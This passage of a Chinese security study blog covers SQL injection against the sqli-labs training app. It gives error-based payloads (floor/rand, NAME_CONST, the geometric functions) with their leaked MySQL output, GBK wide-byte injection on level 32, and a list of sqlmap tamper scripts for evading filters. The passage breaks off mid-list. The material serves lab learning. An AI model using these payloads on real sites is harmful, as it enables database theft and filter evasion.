+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.8/sqli-labs/Less-5/?id=1&apos; union select count(*),2,3 from users group by concat(database(),floor(rand(0)*2))-- </span><br><span class="line">http://192.168.100.8/sqli-labs/Less-5/?id=1&apos; union select count(*),2,3 from information_schema.tables group by concat((select concat(table_schema,&apos;:&apos;,table_name) from information_schema.tables limit 0,1),floor(rand(0)*2))--</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-1-4-数据库的一些特性"><a href="#3-1-4-数据库的一些特性" class="headerlink" title="3.1.4 数据库的一些特性"></a>3.1.4 数据库的一些特性</h3><blockquote>
+<p>利用数据库的一些特性产生报错信息。</p>
+</blockquote>
+<p><strong>列名重复</strong></p>
+<p>mysql列名重复会报错，我们利用name_const来制造一个列，根据官方文档，name_const函数要求参数必须是常量，所以实际使用上还没找到什么比较好的利用方式。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &apos;5.5.36-log&apos;</span><br></pre></td></tr></table></figure>
+
+<p>利用这个特性加上join函数可以爆列名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from(select * from users a join users b)c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &apos;id&apos;</span><br><span class="line">mysql&gt; select * from(select * from users a join users b using(id))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &apos;username&apos;</span><br><span class="line">mysql&gt; select * from(select * from users a join users b using(id,username))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &apos;password&apos;</span><br></pre></td></tr></table></figure>
+
+<p>注入实例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.8/sqli-labs/Less-5/?id=1&apos;union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --</span><br></pre></td></tr></table></figure>
+
+<p><strong>几何函数</strong></p>
+<blockquote>
+<p>mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为5.5.47上可以用来注入，而在5.7.17上则不行，不同的函数情况版本情况可能不一样。</p>
+</blockquote>
+<p><strong>（1）geometrycollection()</strong></p>
+<p>GeometryCollection是由1个或多个任意类几何对象构成的几何对象。GeometryCollection中的所有元素必须具有相同的空间参考系（即相同的坐标系）。对GeometryCollection的元素无任何限制。攻击载荷查询的为一串字符,然后用处理geometrycollection(),由于MYSQL无法用这样字符串画出图形,所以报错了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br><span class="line">mysql&gt; select geometrycollection((select * from(select * from(select database())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;(select `b`.`database()` from (select &apos;security&apos; AS `database()` from dual) `b`)&apos; value found during parsing</span><br><span class="line">mysql&gt; select geometrycollection((select * from(select * from(select concat(table_schema, &apos;:&apos;,table_name) from information_schema.tables limit 0,1)a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;(select `b`.`concat(table_schema, &apos;:&apos;,table_name)` from (select &apos;information_schema:CHARACTER_SETS&apos; AS `concat(table_schema, &apos;:&apos;,table_name)` from dual) `b`)&apos; value found during parsing</span><br><span class="line">mysql&gt; select geometrycollection((select * from(select * from(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;(select `b`.`group_concat(table_name)` from (select &apos;emails,referers,uagents,users&apos; AS `group_concat(table_name)` from dual) `b`)&apos; value found during parsing</span><br></pre></td></tr></table></figure>
+
+<p><strong>注入实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.8/sqli-labs/Less-5/?id=1&apos; and geometrycollection((select * from(select * from(select database())a)b)) -- </span><br><span class="line">http://192.168.100.8/sqli-labs/Less-5/?id=1&apos; union select geometrycollection((select * from(select * from(select database())a)b)),2,3 -- </span><br><span class="line">http://192.168.100.8/sqli-labs/Less-5/?id=1&apos; and geometrycollection((select * from(select * from(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)a)b))-- </span><br><span class="line">http://192.168.100.8/sqli-labs/Less-5/?id=1&apos; union geometrycollection((select * from(select * from(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)a)b)),2,3--</span><br></pre></td></tr></table></figure>
+
+<p><strong>multipoint()</strong></p>
+<p>MultiPoint是一种由Point元素构成的几何对象集合。这些点未以任何方式连接或排序。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br></pre></td></tr></table></figure>
+
+<p> 其余用法同geometrycollection()。</p>
+<p><strong>polygon()</strong></p>
+<p>Polygon是代表多边几何对象的平面Surface。它由单个外部边界以及0或多个内部边界定义，其中，每个内部边界定义为Polygon中的1个孔。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select polygon((select * from(select * from(select user())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br></pre></td></tr></table></figure>
+
+<p> 其余用法同geometrycollection()。</p>
+<p><strong>multipolygon()</strong></p>
+<p>multipolygon()是一种由Polygon元素构成的几何对象集合。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br></pre></td></tr></table></figure>
+
+<p>其余用法同geometrycollection()。</p>
+<p><strong>linestring()</strong></p>
+<p>LineString()是具有点之间线性内插特性的Curve。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select linestring((select * from(select * from(select user())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br></pre></td></tr></table></figure>
+
+<p>其余用法同geometrycollection()。</p>
+<p><strong>multilinestring()</strong></p>
+<p>multilinestring()是一种由LineStirng元素构成的MultiCurve几何对象集合。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br></pre></td></tr></table></figure>
+
+<p>其余用法同geometrycollection()。</p>
+<h2 id="0x04-宽字节注入"><a href="#0x04-宽字节注入" class="headerlink" title="0x04 宽字节注入"></a>0x04 宽字节注入</h2><h3 id="4-1-注入原理"><a href="#4-1-注入原理" class="headerlink" title="4.1 注入原理"></a>4.1 注入原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.当某字符的大小为一个字节时，称其字符为窄字节.</span><br><span class="line"></span><br><span class="line">2.当某字符的大小为两个字节时，称其字符为宽字节.</span><br><span class="line"></span><br><span class="line">3.所有英文默认占一个字节，汉字占两个字节</span><br><span class="line"></span><br><span class="line">4.常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等等</span><br></pre></td></tr></table></figure>
+
+<p>GBK 占用两字节，ASCII占用一字节</p>
+<p>程序员为了防止sql注入，对用户输入中的单引号  <code>&#39;</code>  进行处理，在单引号前加上斜杠 <code>\</code>进行转义，这样被处理后的sql语句中，单引号不再具有  <code>&#39;  &#39;</code>  作用，仅仅是<code>内容</code>而已，换句话说，这个单引号<strong>无法发挥和前后单引号闭合的作用，仅仅成为内容</strong></p>
+<p>再举个例子，要找某位名字里带单引号的用户，搜索的时候，就要让单引号成为内容去搜索，而不能起到其他作用</p>
+<p><strong>而安全测试人员要绕过这个转义处理，使单引号发挥作用，有两个思路：</strong></p>
+<p>第一个思路就是借鉴程序员的防范思路，对斜杠（\）转义，使其失去转义单引号的作用，成为‘内容’</p>
+<p>第二个思路就是<strong>宽字节注入</strong></p>
+<p><img src="/2019/09/19/第六周：数据库相关注入语句的收集和学习/Typora/1335588-20190323124213653-1124895243.png" alt="1335588-20190323124213653-1124895243"></p>
+<p>当使用宽字节编码，如：GBK时，两个连在一起的字符会被认为是汉字，我们可以在单引号前加一个字符，使其和斜杠（\）组合被认为成汉字，从未达到让斜杠消失的目的，进而使单引号发挥作用</p>
+<p><strong>注意：</strong>前一个字符的Ascii要大于128，两个字符才能组合成汉字</p>
+<h3 id="4-2-在sqli-labs上用宽字节注入实战"><a href="#4-2-在sqli-labs上用宽字节注入实战" class="headerlink" title="4.2 在sqli-labs上用宽字节注入实战"></a>4.2 在sqli-labs上用宽字节注入实战</h3><p><strong>第三十二关</strong></p>
+<p>宽字节注入，单引号闭合。</p>
+<p><strong>本来原始页面是这样的：</strong></p>
+<p><img src="/2019/09/19/第六周：数据库相关注入语句的收集和学习/Typora/1568897978843.png" alt="1568897978843"></p>
+<p><strong>在url后加上<code>?id=1&#39;</code>后提示单引号 <code>&#39;</code> 被转义了，由此我们想到利用宽字节注入</strong><img src="/2019/09/19/第六周：数据库相关注入语句的收集和学习/Typora/1568898108689.png" alt="1568898108689"></p>
+<p><strong>在单引号前面加上%df  报错了，说明单引号闭合成功！</strong></p>
+<p><img src="/2019/09/19/第六周：数据库相关注入语句的收集和学习/Typora/1568898247396.png" alt="1568898247396"></p>
+<p><strong>数据库：</strong><br><code>?id=1.1%df&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code><br><strong>数据表：</strong><br><code>?id=1.1%df&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></p>
+<p>再多说一下字段名，因为查询字段的时候要有where table_name=’user’，注意，user用引号括起来，但是会被转义：因为没有表叫user�\。所以这里要把表名转换成16进制进行绕过（转换之前不用加引号，只转换表名就好了），然后写注入语句的时候在16进制的表名前再加个0x，user转换成16进制是75736572。<br><strong>字段名：</strong><br><code>?id=1.1%df&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x75736572 --+</code></p>
+<p><a href="https://www.cnblogs.com/Rain99-/p/10583406.html" target="_blank" rel="noopener">参考文章：宽字节注入</a></p>
+<p><a href="https://www.jianshu.com/p/123c01cf4f96" target="_blank" rel="noopener">参考文章：sqli-labs level32-37 宽字节注入</a></p>
+<h2 id="0x05-sqlmap-自带-tamper-的原理"><a href="#0x05-sqlmap-自带-tamper-的原理" class="headerlink" title="0x05   sqlmap 自带 tamper 的原理"></a>0x05   sqlmap 自带 tamper 的原理</h2><p><strong>sqlmap tamper的命令如下</strong></p>
+<p>sqlmap -u [url] –tamper [模块名]</p>
+<h3 id="5-1-常用tamper脚本"><a href="#5-1-常用tamper脚本" class="headerlink" title="5.1 常用tamper脚本"></a>5.1 常用tamper脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line">apostrophemask.py</span><br><span class="line">适用数据库：ALL </span><br><span class="line">作用：将引号替换为utf-8，用于过滤单引号 </span><br><span class="line">使用脚本前：tamper(&quot;1 AND &apos;1&apos;=&apos;1&quot;) </span><br><span class="line">使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</span><br><span class="line"></span><br><span class="line">base64encode.py</span><br><span class="line">适用数据库：ALL </span><br><span class="line">作用：替换为base64编码 </span><br><span class="line">使用脚本前：tamper(&quot;1&apos; AND SLEEP(5)#&quot;) </span><br><span class="line">使用脚本后：MScgQU5EIFNMRUVQKDUpIw==</span><br><span class="line"></span><br><span class="line">multiplespaces.py</span><br><span class="line">适用数据库：ALL </span><br><span class="line">作用：围绕sql关键字添加多个空格 </span><br><span class="line">使用脚本前：tamper(&apos;1 UNION SELECT foobar&apos;) </span><br><span class="line">使用脚本后：1 UNION SELECT foobar</span><br><span class="line"></span><br><span class="line">space2plus.py</span><br><span class="line">适用数据库：ALL </span><br><span class="line">作用：用加号替换空格 </span><br><span class="line">使用脚本前：tamper(&apos;SELECT id FROM users&apos;) </span><br><span class="line">使用脚本后：SELECT+id+FROM+users</span><br><span class="line"></span><br><span class="line">nonrecursivereplacement.py</span><br><span class="line">适用数据库：ALL </span><br><span class="line">作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空） </span><br><span class="line">使用脚本前：tamper(&apos;1 UNION SELECT 2--&apos;) </span><br><span class="line">使用脚本后：1 UNIOUNIONN SELESELECTCT 2--</span><br><span class="line"></span><br><span class="line">space2randomblank.py</span><br><span class="line">适用数据库：ALL </span><br><span class="line">作用：将空格替换为其他有效字符 </span><br><span class="line">使用脚本前：tamper(&apos;SELECT id FROM users&apos;) </span><br><span class="line">使用脚本后：SELECT%0Did%0DFROM%0Ausers</span><br><span class="line"></span><br><span class="line">unionalltounion.py</span><br><span class="line">适用数据库：ALL </span><br><span class="line">作用：将union allselect 替换为unionselect </span><br><span class="line">使用脚本前：tamper(&apos;-1 UNION ALL SELECT&apos;) </span><br><span class="line">使用脚本后：-1 UNION SELECT</span><br><span class="line"></span><br><span class="line">securesphere.py</span><br><span class="line">适用数据库：ALL </span><br><span class="line">作用：追加特定的字符串 </span><br><span class="line">使用脚本前：tamper(&apos;1 AND 1=1&apos;) </span><br><span class="line">使用脚本后：1 AND 1=1 and &apos;0having&apos;=&apos;0having&apos;</span><br><span class="line"></span><br><span class="line">space2dash.py</span><br><span class="line">适用数据库：ALL </span><br><span class="line">作用：将空格替换为--，并添加一个随机字符串和换行符 </span><br><span class="line">使用脚本前：tamper(&apos;1 AND 9227=9227&apos;) </span><br><span class="line">使用脚本后：1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227</span><br><span class="line"></span><br><span class="line">space2mssqlblank.py</span><br><span class="line">适用数据库：Microsoft SQL Server </span><br><span class="line">测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005 </span><br><span class="line">作用：将空格随机替换为其他空格符号(&apos;%01&apos;, &apos;%02&apos;, &apos;%03&apos;, &apos;%04&apos;, &apos;%05&apos;, &apos;%06&apos;, &apos;%07&apos;, &apos;%08&apos;, &apos;%09&apos;, &apos;%0B&apos;, &apos;%0C&apos;, &apos;%0D&apos;, &apos;%0E&apos;, &apos;%0F&apos;, &apos;%0A&apos;) </span><br><span class="line">使用脚本前：tamper(&apos;SELECT id FROM users&apos;) </span><br><span class="line">使用脚本后：SELECT%0Eid%0DFROM%07users</span><br><span class="line"></span><br><span class="line">between.py</span><br><span class="line">测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 </span><br><span class="line">作用：用NOT BETWEEN 0 AND #替换&gt; </span><br><span class="line">使用脚本前：tamper(&apos;1 AND A &gt; B--&apos;) </span><br><span class="line">使用脚本后：1 AND A NOT BETWEEN 0 AND B--</span><br><span class="line"></span><br><span class="line">percentage.py</span><br><span class="line">适用数据库：ASP </span><br><span class="line">测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0 </span><br><span class="line">作用：在每个字符前添加一个% </span><br><span class="line">使用脚本前：tamper(&apos;SELECT FIELD FROM TABLE&apos;) </span><br><span class="line">使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</span><br><span class="line"></span><br><span class="line">sp_password.py</span><br><span class="line">适用数据库：MSSQL </span><br><span class="line">作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password </span><br><span class="line">使用脚本前：tamper(&apos;1 AND 9227=9227-- &apos;) </span><br><span class="line">使用脚本后：1 AND 9227=9227-- sp_password</span><br><span class="line"></span><br><span class="line">charencode.py</span><br><span class="line">测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 </span><br><span class="line">作用：对给定的payload全部字符使用url编码（不处理已经编码的字符） </span><br><span class="line">使用脚本前：tamper(&apos;SELECT FIELD FROM%20TABLE&apos;) </span><br><span class="line">使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</span><br><span class="line"></span><br><span class="line">randomcase.py</span><br><span class="line">测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 </span><br><span class="line">作用：随机大小写 </span><br><span class="line">使用脚本前：tamper(&apos;INSERT&apos;) </span><br><span class="line">使用脚本后：INseRt</span><br><span class="line"></span><br><span class="line">charunicodeencode.py</span><br><span class="line">适用数据库：ASP、ASP.NET </span><br><span class="line">测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3 </span><br><span class="line">作用：适用字符串的unicode编码 </span><br><span class="line">使用脚本前：tamper(&apos;SELECT FIELD%20FROM TABLE&apos;) </span><br><span class="line">使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</span><br><span class="line"></span><br><span class="line">space2comment.py</span><br><span class="line">测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 </span><br><span class="line">作用：将空格替换为/**/ </span><br><span class="line">使用脚本前：tamper(&apos;SELECT id FROM users&apos;) </span><br><span class="line">使用脚本后：SELECT/**/id/**/FROM/**/users</span><br><span class="line"></span><br><span class="line">equaltolike.py</span><br><span class="line">测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5 </span><br><span class="line">作用：将=替换为LIKE </span><br><span class="line">使用脚本前：tamper(&apos;SELECT * FROM users WHERE id=1&apos;) </span><br><span class="line">使用脚本后：SELECT * FROM users WHERE id LIKE 1</span><br><span class="line"></span><br><span class="line">equaltolike.py</span><br><span class="line">测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 </span><br><span class="line">作用：将&gt;替换为GREATEST，绕过对&gt;的过滤 </span><br><span class="line">使用脚本前：tamper(&apos;1 AND A &gt; B&apos;) </span><br><span class="line">使用脚本后：1 AND GREATEST(A,B+1)=A</span><br><span class="line"></span><br><span class="line">ifnull2ifisnull.py</span><br><span class="line">适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly) </span><br><span class="line">测试通过数据库：MySQL 5.0 and 5.5 </span><br><span class="line">作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤 </span><br><span class="line">使用脚本前：tamper(&apos;IFNULL(1, 2)&apos;) </span><br><span class="line">使用脚本后：IF(ISNULL(1),2,1)</span><br><span class="line"></span><br><span class="line">modsecurityversioned.py</span><br><span class="line">适用数据库：MySQL </span><br><span class="line">测试通过数据库：MySQL 5.0 </span><br><span class="line">作用：过滤空格，使用mysql内联注释的方式进行注入 </span><br><span class="line">使用脚本前：tamper(&apos;1 AND 2&gt;1--&apos;) </span><br><span class="line">使用脚本后：1 /*!30874AND 2&gt;1*/--</span><br><span class="line"></span><br><span class="line">space2mysqlblank.py</span><br><span class="line">适用数据库：MySQL </span><br><span class="line">测试通过数据库：MySQL 5.1 </span><br><span class="line">作用：将空格替换为其他空格符号(&apos;%09&apos;, &apos;%0A&apos;, &apos;%0C&apos;, &apos;%0D&apos;, &apos;%0B&apos;) </span><br><span class="line">使用脚本前：tamper(&apos;SELECT id FROM users&apos;) </span><br><span class="line">使用脚本后：SELECT%0Bid%0DFROM%0Cusers</span><br><span class="line"></span><br><span class="line">modsecurityzeroversioned.py</span><br><span class="line">适用数据库：MySQL </span><br><span class="line">测试通过数据库：MySQL 5.0 </span><br><span class="line">作用：使用内联注释方式（/*!00000*/）进行注入 </span><br><span class="line">使用脚本前：tamper(&apos;1 AND 2&gt;1--&apos;) </span><br><span class="line">使用脚本后：1 /*!00000AND 2&gt;1*/--</span><br><span class="line"></span><br><span class="line">space2mysqldash.py</span><br><span class="line">适用数据库：MySQL、MSSQL </span><br><span class="line">作用：将空格替换为 -- ，并追随一个换行符 </span><br><span class="line">使用脚本前：tamper(&apos;1 AND 9227=9227&apos;) </span><br><span class="line">使用脚本后：1--%0AAND--%0A9227=9227</span><br><span class="line"></span><br><span class="line">bluecoat.py</span><br><span class="line">适用数据库：Blue Coat SGOS </span><br><span class="line">测试通过数据库：MySQL 5.1,、SGOS </span><br><span class="line">作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换= </span><br><span class="line">使用脚本前：tamper(&apos;SELECT id FROM users where id = 1&apos;) </span><br><span class="line">使用脚本后：SELECT%09id FROM users where id LIKE 1</span><br><span class="line"></span><br><span class="line">versionedkeywords.py</span><br><span class="line">适用数据库：MySQL </span><br><span class="line">测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11 </span><br><span class="line">作用：注释绕过 </span><br><span class="line">使用脚本前：tamper(&apos;1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#&apos;) </span><br><span class="line">使用脚本后：1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py</span><br><span class="line">适用数据库：MySQL &lt; 5.1 </span><br><span class="line">测试通过数据库：MySQL 4.0.18/5.0.22 </span><br><span class="line">作用：在每个关键字前添加mysql版本注释 </span><br><span class="line">使用脚本前：tamper(&quot;value&apos; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &apos;QDWa&apos;=&apos;QDWa&quot;) </span><br><span class="line">使用脚本后：value&apos;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND &apos;QDWa&apos;=&apos;QDWa</span><br><span class="line"></span><br><span class="line">space2morehash.py</span><br><span class="line">适用数据库：MySQL &gt;= 5.1.13 </span><br><span class="line">测试通过数据库：MySQL 5.1.41 </span><br><span class="line">作用：将空格替换为#，并添加一个随机字符串和换行符 </span><br><span class="line">使用脚本前：tamper(&apos;1 AND 9227=9227&apos;) </span><br><span class="line">使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</span><br><span class="line"></span><br><span class="line">apostrophenullencode.py</span><br><span class="line">适用数据库：ALL </span><br><span class="line">作用：用非法双字节Unicode字符替换单引号 </span><br><span class="line">使用脚本前：tamper(&quot;1 AND &apos;1&apos;=&apos;1&quot;) </span><br><span class="line">使用脚本后：1 AND %00%271%00%27=%00%271</span><br><span 